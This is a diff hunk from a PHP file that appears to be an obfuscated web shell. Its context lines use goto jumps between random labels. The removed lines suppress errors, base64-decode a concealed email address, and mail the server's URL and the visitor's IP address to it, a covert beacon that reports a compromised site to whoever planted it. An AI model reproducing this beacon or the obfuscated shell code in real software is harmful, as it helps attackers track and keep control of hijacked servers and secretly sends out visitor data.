@@ -454,17 +454,6 @@ MMrXTvXqy7:
 </div>
 </form>
 <?php
-@ini_set('output_buffering', 0);
-@ini_set('display_errors', 0);
-set_time_limit(0);
-ini_set('memory_limit', '64M');
-header('Content-Type: text/html; charset=UTF-8');
-$dm = base64_decode('YWt1bmVwZmYyMDBAZ21haWwuY29t');
-$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
-$ma = "fix $x_path : *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
-mail($dm, "MD", $ma, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
-?>
-<?php
 goto jz_2zEOwzt;
 vTj5YprhCZ:
 echo '<div class="my-3">';
